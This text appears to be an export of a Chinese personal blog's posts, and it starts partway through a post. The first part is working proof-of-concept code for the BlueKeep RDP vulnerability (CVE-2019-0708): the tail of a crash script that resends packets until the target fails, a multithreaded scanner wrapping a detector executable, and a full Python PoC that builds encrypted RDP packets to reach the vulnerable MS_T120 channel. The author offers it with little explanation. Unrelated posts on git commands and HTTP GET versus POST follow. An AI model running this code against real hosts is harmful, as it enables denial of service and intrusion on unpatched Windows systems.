&quot;32&quot;: p = b&quot;\x03\x00\x00\x2e\x02\xf0\x80\x64\x00\x07\x03\xef\x70\x14\x0c\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot; elif arch == &quot;64&quot;: p = b&quot;\x03\x00\x00\x2e\x02\xf0\x80\x64\x00\x07\x03\xef\x70\x14\x0c\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot; else: print(&quot;Make the second arguement &apos;32&apos; or &apos;64&apos; without quotes&quot;) sys.exit() tls.sendall(p)def terminate_connection(tls): p = b&quot;\x03\x00\x00\x09\x02\xf0\x80\x21\x80&quot; tls.sendall(p)def main(args): tls = send_init_packets(args[1]) send_client_data(tls) print(&quot;[+] ClientData Packet Sent&quot;) send_channel_packets(tls) print(&quot;[+] ChannelJoin/ErectDomain/AttachUser Sent&quot;) send_client_info(tls) print(&quot;[+] ClientInfo Packet Sent&quot;) tls.recv(8192) tls.recv(8192) send_confirm_active(tls, None) print(&quot;[+] ConfirmActive Packet Sent&quot;) send_establish_session(tls) print(&quot;[+] Session Established&quot;) send_kill_packet(tls, args[2]) terminate_connection(tls) print(&quot;[+] Vuln Should Trigger&quot;)if __name__ == &apos;__main__&apos;: if len(sys.argv) != 3: print(&quot;Usage: python poc.py 127.0.0.1 64&quot;) sys.exit() elif sys.argv[2] == &apos;32&apos; or &apos;64&apos;: # I&apos;ve had to send the packets 5 times for hosts that havent # had a terminal session since their last reboot. I think # I know why but atm its just easier to send the exchange # 5 times and it&apos;ll crash eventually. Most of the time its # the first time though. for _ in range(5): main(sys.argv) else: print(&quot;Usage: python poc.py 127.0.0.1 64&quot;) sys.exit()]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CVE-2019-0708</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2019-0708]]></title>
    <url>%2F2019%2F05%2F22%2FCVE-2019-0708%2F</url>
    <content type="text"><![CDATA[关于这个cve看了几天的cxk。等到到大佬发出了验证方式。特来验证一下。 人生苦短我用python 方法一使用前几天360推出的exe 12345678910111213141516171819202122232425262728293031323334353637383940414243444546# _*_ coding: utf-8 _*_&quot;&quot;&quot;auth: bigger.wingversion: v1.0function: cve-2019-0708漏洞检测usage:note: 借助于poc做检测, 3389_hosts为IP地址清单，0708detector.exe为poc&quot;&quot;&quot;import osimport subprocessfrom multiprocessing.dummy import Pool as ThreadPoolcurrent_abs_path = os.path.abspath(__file__)current_abs_path_dir = os.path.dirname(current_abs_path)poc = os.path.abspath(current_abs_path_dir) + &apos;/0708detector.exe&apos;def cve_2019_0708(ip, port=&apos;3389&apos;): command = poc + &apos; -t &apos; + ip + &apos; -p &apos; + port result = subprocess.getoutput(command) # print(command, &apos;\n&apos;, result) if &apos;WARNING: SERVER IS VULNERABLE&apos; in result: result = &apos;%s 存在CVE-2019-0708漏洞&apos; % ip else: result = &apos;%s 不存在CVE-2019-0708漏洞&apos; % ip print(result)if __name__ == &apos;__main__&apos;: rdp_hosts = [] with open(&apos;3389_hosts&apos;, &apos;r&apos;) as f: data = f.readlines() for x in data: ip = x.strip() rdp_hosts.append(ip) pool = ThreadPool(10) pool.map(cve_2019_0708, rdp_hosts) 方法二找了一个最终不是输出cxk的poc,好好研究研究 …… 算了 能用就行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371 &quot;&quot;&quot;CVE-2019-0708the worst PoC for just hitting vulnerable path | NOT DOS!!!!! by Mateusz GarncarekSome documentation and code parts:https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/e78db616-689f-4b8a-8a99-525f7a433ee2https://winprotocoldoc.blob.core.windows.net/productionwindowsarchives/MS-RDPBCGR/%5bMS-RDPBCGR%5d.pdfhttps://github.com/citronneur/rdpyNote:- this PoC is tested against only Windows XP x86 SP3- Better connecting channels, now you can set up to 31 channels (Big thanks to anonymous contributor)&quot;&quot;&quot;import socketimport sysimport structimport hashlibdef confirm_channel(s, number): &quot;&quot;&quot; @param s: &#123;sock&#125; socket handle @param number: &#123;int&#125; channel count &quot;&quot;&quot; if 0xec + number &gt;= 0x100: packet = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00&quot; + bytes([(number+3)%0x100]) + b&quot;\x04&quot; + bytes([(0xec + number)%0x100]) else: packet = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00&quot; + bytes([(number+3)%0x100]) + b&quot;\x03&quot; + bytes([0xec + number]) s.send(packet) received_data = s.recv(1024) packet = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00&quot; + bytes([(number+3)%0x100]) + b&quot;\x03\xeb&quot; s.send(packet) received_data = s.recv(1024) for i in range(0, number): if 0xec + i &gt;= 0x100: packet = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00&quot; + bytes([(number+3)%0x100]) + b&quot;\x04&quot; + bytes([(0xec + i)%0x100]) else: packet = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x38\x00&quot; + bytes([(number+3)%0x100]) + b&quot;\x03&quot; + bytes([0xec + i]) s.send(packet) received_data = s.recv(1024) print(&apos;[Info] Confirm No.%d channel.&apos; % i)def macData(macSaltKey, data): &quot;&quot;&quot; @see: http://msdn.microsoft.com/en-us/library/cc241995.aspx @param macSaltKey: &#123;str&#125; mac key @param data: &#123;str&#125; data to sign @return: &#123;str&#125; signature &quot;&quot;&quot; sha1Digest = hashlib.sha1() md5Digest = hashlib.md5() #encode length dataLength = len(data) dataLength = struct.pack(&apos;&lt;I&apos;,dataLength) b36 = b&quot;\x36&quot; * 40 sha1Digest.update(macSaltKey) sha1Digest.update(b36) sha1Digest.update(dataLength) sha1Digest.update(data) sha1Sig = sha1Digest.digest() b5c = b&quot;\x5c&quot; * 48 md5Digest.update(macSaltKey) md5Digest.update(b5c) md5Digest.update(sha1Sig) return md5Digest.digest()def crypt(key, data): S = list(range(256)) j = 0 for i in list(range(256)): j = (j + S[i] + ord(key[i % len(key)])) % 256 S[i], S[j] = S[j], S[i] j = 0 y = 0 out = [] for char in data: j = (j + 1) % 256 y = (y + S[j]) % 256 S[j], S[y] = S[y], S[j] out.append(chr(ord(char) ^ S[(S[j] + S[y]) % 256])) return &apos;&apos;.join(out)def SaltedHash(Secret, I,client_random,server_random): md5 = hashlib.md5() sha1 = hashlib.sha1() Secretb = bytearray() Secretb.extend(map(ord, Secret)) Ib = bytearray() Ib.extend(map(ord, I)) client_randomb = bytearray() client_randomb.extend(map(ord, client_random)) server_randomb = bytearray() server_randomb.extend(map(ord, server_random)) sha1.update(Ib+Secretb+client_randomb+server_randomb) md5.update(Secretb+sha1.digest()) return md5.digest()def finalHash(key, client_random, server_random): &quot;&quot;&quot; @summary: MD5(in0[:16] + in1[:32] + in2[:32]) @param key: in 16 @param random1: in 32 @param random2: in 32 @return MD5(in0[:16] + in1[:32] + in2[:32]) &quot;&quot;&quot; client_randomb = bytearray() client_randomb.extend(map(ord, client_random)) server_randomb = bytearray() server_randomb.extend(map(ord, server_random)) md5Digest = md5 = hashlib.md5() md5Digest.update(key) md5Digest.update(client_randomb) md5Digest.update(server_randomb) return md5Digest.digest()#Hardcoded Client Info PDUpacket_to_encrypt = b&quot;&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x5B\x01\x01\x00\x00\x00\x08\x00\x08\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x74\x00\x65\x00\x73\x00\x74\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x74\x00\x65\x00\x73\x00\x74\x00\x00\x00\x00\x00\x00\x00\x02&quot;packet_to_encrypt +=b&quot;\x00\x02\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;packet_to_encrypt +=b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;client_random = b&quot;&quot;client_random += b&quot;\xff\xee\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;client_random += b&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff&quot;host = &apos;192.168.195.131&apos;port = 3389s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((host, port))received_data = &quot;&quot;packet1 = b&quot;\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x01\x00\x00\x00&quot;s.send(packet1)received_data = s.recv(10024)print(&quot;1st packet sent&quot;)#Initial PDU with GCC Conference Create RequestPDU = &quot;\x03\x00\x01\x70\x02\xF0\x80\x7F\x65\x82\x01\x64\x04\x01\x01\x04\x01&quot;PDU +=&quot;\x01\x01\x01\xFF\x30\x19\x02\x01\x22\x02\x01\x02\x02\x01\x00\x02\x01&quot;PDU +=&quot;\x01\x02\x01\x00\x02\x01\x01\x02\x02\xFF\xFF\x02\x01\x02\x30\x19\x02&quot;PDU +=&quot;\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x01\x02\x01\x00\x02\x01\x01&quot;PDU +=&quot;\x02\x02\x04\x20\x02\x01\x02\x30\x1C\x02\x02\xFF\xFF\x02\x02\xFC\x17&quot;PDU +=&quot;\x02\x02\xFF\xFF\x02\x01\x01\x02\x01\x00\x02\x01\x01\x02\x02\xFF\xFF&quot;PDU +=&quot;\x02\x01\x02\x04\x82\x01\x03\x00\x05\x00\x14\x7C\x00\x01\x80\xFA\x00&quot;PDU +=&quot;\x08\x00\x10\x00\x01\xC0\x00\x44\x75\x63\x61\x80\xEC\x01\xC0\xD8\x00&quot;PDU +=&quot;\x04\x00\x08\x00\x00\x04\x20\x03\x01\xCA\x03\xAA\x09\x04\x00\x00\xCE&quot;PDU +=&quot;\x0E\x00\x00\x44\x00\x45\x00\x53\x00\x4B\x00\x54\x00\x4F\x00\x50\x00&quot;PDU +=&quot;\x2D\x00\x37\x00\x39\x00\x46\x00\x56\x00\x56\x00\x30\x00\x43\x00\x00&quot;PDU +=&quot;\x00\x04\x00\x00\x00\x00\x00\x00\x00\x0C\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\xCA\x01\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x18\x00\x0F\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&quot;PDU +=&quot;\x00\x00\x00\x00\x00\x00\x00\x00\x03\xC0\x08\x00&quot;#number of channelschannel_num = 0x1FPDU += &quot;%c\x00\x00\x00&quot; % channel_num&quot;&quot;&quot;channels(name + nullbytes + CHANNEL_DEF::options)72 64 70 64 72 00 00 00 -&gt; CHANNEL_DEF::name = &quot;rdpdr&quot;00 00 80 80 -&gt; CHANNEL_DEF::options = 0x808000000x80800000 = 0x80000000 | 0x00800000 = CHANNEL_OPTION_INITIALIZED | CHANNEL_OPTION_COMPRESS_RDP&quot;&quot;&quot;PDU += &quot;rdpdr&quot; + &quot;\x00\x00\x00&quot; + &quot;\x00\x00\x80\x80&quot;#PDU += &quot;rdpsnd&quot;+&quot;\x00\x00&quot; + &quot;\x00\x00\x00\xc0&quot;#PDU += &quot;cliprdr&quot;+ &quot;\x00&quot;+ &quot;\x00\x00\xa0\xc0&quot;#PDU += &quot;AAAAAAA&quot; + &quot;\x00&quot; + &quot;\x00\x00\x00\x80&quot;padding_channel = &quot;AAAAAAAA&quot; + &quot;\x41\x41\x41\x41&quot;PDU += padding_channel * (channel_num - 2)PDU += &quot;MS_T120&quot; + &quot;\x00&quot; + &quot;\x00\x00\x00\x80&quot;#PDU += &quot;drdynvc&quot; + &quot;\x00&quot;+ &quot;\x00\x00\x80\xc0&quot;PDU += &quot;\x02\xc0\x0c\x00\x0b\x00\x00\x00\x00\x00\x00\x00&quot;length_packet = len(PDU)print(length_packet)#stupid calculating length for ASN.1 xD(now little bit better)ber = length_packet-12ber2 = length_packet-109ber3 = length_packet-118ber4 = length_packet-132ber5 = 8+length_packet+(channel_num*12) - length_packetlength_packetb = struct.pack(&quot;&gt;h&quot;, length_packet)berb = length_packet = struct.pack(&quot;&gt;h&quot;, ber)ber2b = length_packet = struct.pack(&quot;&gt;h&quot;, ber2)ber3b = length_packet = struct.pack(&quot;&gt;h&quot;, ber3)ber4b = length_packet = struct.pack(&quot;&gt;h&quot;, ber4)ber5b = length_packet = struct.pack(&quot;&gt;h&quot;, ber5)#worst calculating length for ASN.1 xDPDU_b = bytearray()PDU_b.extend(map(ord, PDU))#print(hex(ber3b[0]+0x80))#print(ord(ber3b[0])+hex(PDU_b[116]))PDU_b[2] = length_packetb[0]PDU_b[3] = length_packetb[1]PDU_b[10] = berb[0]PDU_b[11] = berb[1]PDU_b[107] = ber2b[0]PDU_b[108] = ber2b[1]#Better hardcoded high part of length xDDDDDDDDdPDU_b[116] = ber3b[0]+0x80PDU_b[117] = ber3b[1] #Better hardcoded high part of length xDDDDDDDDdPDU_b[130] = ber4b[0]+0x80PDU_b[131] = ber4b[1]PDU_b[351] = ber5b[0]PDU_b[350] = ber5b[1]s.send(PDU_b)received_data = s.recv(1024)#Now little bit betterif channel_num % 2 != 0: server_random = received_data[4+107+(2*channel_num):4+139+(2*channel_num)] modulus = received_data[4+175+(2*channel_num):4+239+(2*channel_num)] public_exponent = received_data[4+171+(2*channel_num):4+175+(2*channel_num)]else: server_random = received_data[2+107+(2*channel_num):2+139+(2*channel_num)] modulus = received_data[2+175+(2*channel_num):2+239+(2*channel_num)] public_exponent = received_data[2+171+(2*channel_num):2+175+(2*channel_num)]print(&quot;Initial PDU sent&quot;)#Obtaining things for RSA modulus = int.from_bytes(modulus, byteorder=&apos;little&apos;)public_exponent = int.from_bytes(public_exponent, byteorder=&apos;little&apos;)client_random = int.from_bytes(client_random, byteorder=&apos;little&apos;)#Encrypting client radom encrypted_client_random = pow(client_random,public_exponent,modulus )encrypted_client_random = encrypted_client_random.to_bytes(64, byteorder=&apos;little&apos;)####Begin of connecting virtual channels, it&apos;s better now packet3 = b&quot;\x03\x00\x00\x0c\x02\xf0\x80\x04\x01\x00\x01\x00\x03\x00\x00\x08\x02\xf0\x80\x28&quot;s.send(packet3)print(&quot;3rd packet sent&quot;)received_data = s.recv(1024)#packet4 = b&quot;\x03\x00\x00\x08\x02\xf0\x80\x28&quot;#s.send(packet4)#received_data = s.recv(1024)#print(&quot;4th packet sent&quot;)confirm_channel(s, channel_num)###########End of connecting virtual channels#Client Security Exchange PDUPDU_Security_Exchange = b&quot;\x03\x00\x00\x5e\x02\xf0\x80\x64\x00\x03\x03\xeb\x70\x50\x01\x00\x00\x00\x48\x00\x00\x00&quot;PDU_Security_Exchange += encrypted_client_randomPDU_Security_Exchange += b&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;client_random = client_random.to_bytes(32, byteorder=&apos;little&apos;)client_random = &quot;&quot;.join(map(chr, client_random))server_random = &quot;&quot;.join(map(chr, server_random))#Calculating hashes and things for RC4 encryption it&apos;s only done for 128BIT RC4PreMasterSecret = client_random[:24] + server_random[:24]MasterSecret = SaltedHash(PreMasterSecret,&quot;A&quot;,client_random,server_random) + SaltedHash(PreMasterSecret,&quot;BB&quot;,client_random,server_random) + SaltedHash(PreMasterSecret,&quot;CCC&quot;,client_random,server_random)MasterSecret = &quot;&quot;.join(map(chr, MasterSecret))SessionKeyBlob = SaltedHash(MasterSecret,&quot;X&quot;,client_random,server_random) + SaltedHash(MasterSecret,&quot;YY&quot;,client_random,server_random) + SaltedHash(MasterSecret,&quot;ZZZ&quot;,client_random,server_random)FinalClientEncryptKey128 = SessionKeyBlob[32:48]FinalClientEncryptKey128 = finalHash(FinalClientEncryptKey128,client_random,server_random)print(&apos;:&apos;.join(hex(x)[2:] for x in FinalClientEncryptKey128))MACKey128 = SessionKeyBlob[:16]FinalClientEncryptKey128 = &quot;&quot;.join(map(chr, FinalClientEncryptKey128))FinalMac128 = macData(MACKey128, packet_to_encrypt)[:8]packet_to_encrypt = &quot;&quot;.join(map(chr, packet_to_encrypt))encrypted_packet = crypt(FinalClientEncryptKey128,packet_to_encrypt)encrypted_packetb = bytearray()encrypted_packetb.extend(map(ord, encrypted_packet))#print(&apos;:&apos;.join(hex(ord(x))[2:] for x in encrypted_packet)) #Client Info PDU together with #Client Security Exchange PDUClient_Info_PDU = b&quot;&quot;Client_Info_PDU += PDU_Security_ExchangeClient_Info_PDU += b&quot;\x03\x00\x01\x05\x02\xf0\x80\x64\x00\x03\x03\xeb\x70\x80\xf6\x48\x00\x00\x00&quot;Client_Info_PDU += FinalMac128Client_Info_PDU += encrypted_packetbs.send(Client_Info_PDU)received_data = s.recv(1024)print(&quot;Last packet sent&quot;)]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>CVE-2019-0708</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git基础操作]]></title>
    <url>%2F2019%2F05%2F18%2Fgit%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[在开发过程中经常用到git与github，对于一个稳定的项目常常就用到极少的命令操作，但是仍然会遇到一些奇奇怪怪的现象，就需要对git进行深入的了解。 0x01 git常用操作0x02 git基础操作初始化仓库123456789git init 初始化仓库,新建一个Git仓库(新建了一个隐藏目录.git) 把远程仓库克隆到本地git clone git@github.com:lioilwin/lioilwin.github.io.gitgit clone git@git.coding.net:lifec/lioilwin.git把本地仓库关联到远程仓库git remote add github git@github.com:lioilwin/lioilwin.github.io.gitgit remote add coding git@git.coding.net:lifec/lioilwin.git 0x03 git进阶操作远程仓库别名1234567如果git clone一个远程仓库, Git会自动添加url,别名为origingit remote 列出远程仓库别名 git remote -v 远程仓库别名对应的实际urlgit remote add [alias] [url] 添加一个新远程仓库git remote rm [alias] 删除远程仓库别名git remote rename [old-alias] [new-alias] 重命名git remote set-url [alias] [url] 更改url,可以加上—push和fetch参数,为同一个别名set不同地址 日志回滚12345678910111213141516171819202122232425262728293031323334353637383940git log --name-only --oneline fileNamegit log --oneline --number 每条log只显示一行,显示number条git log --oneline --graph 图形化显示分支合并历史git log branchname 显示特定分支git log --decorategit log --author=[author name] 指定作者的提交历史.git log --since --before --until --after 根据提交时间筛选git log --grep 根据commit信息过滤git log --stat 改动信息 git reflog reflog记录分支变化或者HEAD引用变化, 当git reflog不指定引用时, 默认列出HEAD的reflog, HEAD@&#123;0&#125;代表HEAD当前的值, HEAD@&#123;3&#125;代表HEAD在3次变化之前的值, git会将变化记录到HEAD对应的reflog文件中, 其路径为.git/logs/HEAD, 分支reflog文件都放在.git/logs/refs的子目录git show commitIDgit diff 不加参数: show diff of unstaged changes. git diff --cached 命令 已经暂存的文件和上次提交之间的差异 git diff HEAD show diff of all staged or unstated changes. git checkout commitID fileNamegit revertgit reset --hardgit分为三个区域: 1.工作区(working directry) 2.暂缓区(stage index) 3.历史记录区(history) git reset --mixed id history变了(提交记录变了),但staged 和 working没变 (默认方式)git reset --soft id history变了(提交记录变了)和staged区都变了,但working没变git reset --hard id 全都变了变化范围:soft (history) &lt; mixed (history + stage) &lt; hard (history + stage + working) 分支1234567891011git branch -v 每一个分支的最后一次提交.git branch 列出本地所有分支,当前分支会被星号标示出 git branch mybranch 创建分支git branch -D mybranch 删除分支 git checkout mybranch 切换分支git checkout -b mybranch 创建并切换分支git rebase master 把master分支更新到当前分支git merge mybranch 分支合并git push [remote-name] :branch-name 删除远程分支 0x04 事件处理合并冲突xxx寻找大文件的id1git verify-pack -v .git/objects/pack/pack-*.idx | sort -k 3 -g | tail -5 查看文件 1git rev-list --objects --all |grep bc8880e2a3d3a4cb0f6a1661e8ce5ad65d3a95a3 删除文件 1git filter-branch --index-filter &apos;git rm --cached --ignore-unmatch DianpingCrawler/dianping.docx&apos; 垃圾回收 123456rm -rf .git/refs/original/git reflog expire --expire=now --allgit gc --prune=nowgit gc --aggressive --prune=nowgit push origin master --force 12git remote prune origin 首先，里面最重要的两条命令是 git filter-branch 和 gc, filter-branch 真正在清理，但是只运行它也是没用的，需要再删除备份的文件，重新打包之类的，最后的gc命令， 用来收集产生的垃圾，最终清除大文件。 清空仓库删除敏感文件不小心上传了关于密码的代码，然后在几次commits中都有操作记录。 或者上传了一个很大的文件，并在几次commit中都有操作记录。 虽然删除了，但是在.git中保存了记录。 github官网帮助 123456789101112131415161718参考GitHub官网: https://help.github.com/articles/removing-sensitive-data-from-a-repository例如, 代码库提交了大量mp3文件, 使用下面命令清除后代码库由233M缩小为1.3M, 提交到GitHub部署博客轻快飞速# 清除垃圾文件(大量无用的mp3文件)git filter-branch --force --index-filter &apos;git rm --cached --ignore-unmatch *.mp3&apos; --prune-empty --tag-name-filter cat -- --all# 提交到远程仓库(如GitHub, 我再次从git clone GitHub代码库会变小为1.3M)git push origin --force --all# 必须回收垃圾,本地仓库才变小git for-each-ref --format=&apos;delete %(refname)&apos; refs/original | git update-ref --stdin git reflog expire --expire=now --allgit gc --prune=nowrm -rf .git/refs/originalgit reflog expire --expire=now --allgit gc --prune=nowgit gc --aggressive --prune=now git rebase 提交干净的主分支在开发的过程中，我们使用master主分支进行开发，在进行一次bug修改多次commit后，便产生了很多的无用的commit日志。这对我们来说不容易进行回滚或者快速定位到版本。 我们可以使用创建dev分支，当在分支中开发后，也许在dev提交了很多次的commit，这个时候我们如果在master直接mergen，那么在master主分支上也将产生许多的commit记录。这与我们的想法产生了分歧。我们希望在主分支上只进行版本发布推送，一个很干净的master。 我们先拉取master分支 1git pull origin master 在本地切换到dev分支，没有分支创建 1git checkout dev 查看dev分支的提交日志1git log --oneline 修改任意文件 做3次提交 123git commit -m&quot;xxx&quot;git commit -m&quot;xxx&quot;git commit -m&quot;xxx&quot; 再次查看提交日志 1git log --oneline 使用rebase合并commit 不太明白为啥是master 1git rebase -i master 这会打开编辑器 123456789101112131415161718pick 32618c4 Start developing a featurepick 62eed47 Fix something from the previous commit # Commands:# p, pick = use commit# r, reword = use commit, but edit the commit message# e, edit = use commit, but stop for amending# s, squash = use commit, but meld into previous commit# f, fixup = like &quot;squash&quot;, but discard this commit&apos;s log message# x, exec = run command (the rest of the line) using shell## These lines can be re-ordered; they are executed from top to bottom.## If you remove a line here THAT COMMIT WILL BE LOST.## However, if you remove everything, the rebase will be aborted.## Note that empty commits are commented out pick就是使用commit squash 将这次的commit合并到上一个commit中 fixup 和squash一样，但是不显示commit的log 使用fixup修改 123456789101112131415161718pick 32618c4 Start developing a featurefixup 62eed47 Fix something from the previous commit # Commands:# p, pick = use commit# r, reword = use commit, but edit the commit message# e, edit = use commit, but stop for amending# s, squash = use commit, but meld into previous commit# f, fixup = like &quot;squash&quot;, but discard this commit&apos;s log message# x, exec = run command (the rest of the line) using shell## These lines can be re-ordered; they are executed from top to bottom.## If you remove a line here THAT COMMIT WILL BE LOST.## However, if you remove everything, the rebase will be aborted.## Note that empty commits are commented out 然后wq保存 查看git 提交记录，只看到合并之后的commit了 1git log --oneline 切换到主分支 1git checkout master 将dev分支与master分支合并 1git merge dev 查看master的日志 1git log --oneline 1234567891011121314$ git log --oneline3fac5ad (HEAD -&gt; master, dev) 修改主readme增加mitmproxy77625f3 (origin/master, origin/dev, origin/HEAD) Update readme.mddef9d0e Update README.mdf9cd80b Update README.md290cffd Update README.md0c8b770 Delete test.py91e8d1e Update README.md2cafbde add autohomeCrawlerbab4c67 fix sohu_news select and upadte progress2fdd921 Delete code_dict.txt1fdb1fe Rename Readme.md to readme.mdab88072 Update readme.mdffe1cae init commit 推送到github 1git push]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git仓库清空]]></title>
    <url>%2F2019%2F05%2F18%2Fgit%E4%BB%93%E5%BA%93%E6%B8%85%E7%A9%BA%2F</url>
    <content type="text"><![CDATA[删除github上的历史信息与删除某一部分敏感数据的方法 人生苦短我用python 删除commitsCheckout 切换分支 git checkout --orphan latest_branch Add all the files 添加内容 git add -A Commit the changes 保存第一次 git commit -am &quot;init commit&quot; Delete the branch 删除主分支 git branch -D master Rename the current branch to master 创建主分支 git branch -m master Finally, force update your repository 强制覆盖 git push -f origin master]]></content>
      <categories>
        <category>git</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[讨论http中get与post的差异]]></title>
    <url>%2F2019%2F05%2F13%2F%E8%AE%A8%E8%AE%BAhttp%E4%B8%ADget%E4%B8%8Epost%E7%9A%84%E5%B7%AE%E5%BC%82%2F</url>
    <content type="text"><![CDATA[GET和POST是HTTP请求的两种基本方法，要说它们的区别，接触过WEB开发的人都能说出一二。 最直观的区别就是GET把参数包含在URL中，POST通过request body传递参数。 post 与get的区别在哪？ 0x01 ‘标准答案’你轻轻松松的给出了一个“标准答案”： GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST么有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 GET参数通过URL传递，POST放在Request body中。 0x02 这是真相GET和POST是什么？HTTP协议中的两种发送请求的方法。 HTTP是什么？HTTP是基于TCP/IP的关于数据如何在万维网中如何通信的协议。 HTTP的底层是TCP/IP。所以GET和POST的底层也是TCP/IP，也就是说，GET/POST都是TCP链接。GET和POST能做的事情是一样一样的。你要给GET加上request body，给POST带上url参数，技术上是完全行的通的。 那么，“标准答案”里的那些区别是怎么回事？ 0x03 有个故事 在我大万维网世界中，TCP就像汽车，我们用TCP来运输数据，它很可靠，从来不会发生丢件少件的现象。 但是如果路上跑的全是看起来一模一样的汽车，那这个世界看起来是一团混乱，送急件的汽车可能被前面满载货物的汽车拦堵在路上，整个交通系统一定会瘫痪。为了避免这种情况发生，交通规则HTTP诞生了。 HTTP给汽车运输设定了好几个服务类别，有GET, POST, PUT, DELETE等等，HTTP规定，当执行GET请求的时候，要给汽车贴上GET的标签（设置method为GET），而且要求把传送的数据放在车顶上（url中）以方便记录。 如果是POST请求，就要在车上贴上POST的标签，并把货物放在车厢里。当然，你也可以在GET的时候往车厢内偷偷藏点货物，但是这是很不光彩；也可以在POST的时候在车顶上也放一些数据，让人觉得傻乎乎的。HTTP只是个行为准则，而TCP才是GET和POST怎么实现的基本。 但是，我们只看到HTTP对GET和POST参数的传送渠道（url还是requrest body）提出了要求。“标准答案”里关于参数大小的限制又是从哪来的呢？ 0x04 运输载体在我大万维网世界中，还有另一个重要的角色：运输公司。 